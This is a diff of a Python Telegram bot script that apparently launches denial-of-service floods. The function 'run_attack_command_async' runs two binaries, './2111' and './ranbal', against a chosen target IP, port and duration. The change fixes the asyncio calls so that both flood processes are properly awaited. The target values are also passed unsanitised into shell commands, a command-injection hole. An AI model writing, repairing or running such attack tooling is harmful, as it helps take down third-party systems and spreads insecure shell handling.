@@ -69,16 +69,15 @@ async def run_attack_command_async(target_ip, target_port, duration):
     attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
     try:
-        # Run both commands (`./2111` and `./ranbal`) concurrently
-        process_2111 = asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
-        process_ranbal = asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
+        # Create both subprocesses and await their execution
+        process_2111 = await asyncio.create_subprocess_shell(f"./2111 {target_ip} {target_port} {duration} 800")
+        process_ranbal = await asyncio.create_subprocess_shell(f"./ranbal {target_ip} {target_port} {duration}")
 
-        # Await both processes using asyncio.gather
+        # Wait for both processes to complete
         await asyncio.gather(
-            process_2111.communicate(),
-            process_ranbal.communicate()
+            process_2111.wait(),
+            process_ranbal.wait()
         )
-
     except Exception as e:
         logging.error(f"Error during attack execution: {e}")
     finally:
@@ -257,4 +256,4 @@ if __name__ == "__main__":
             bot.polling(none_stop=True)
         except Exception as e:
             logging.error(f"Polling error: {e}")
-        
+            
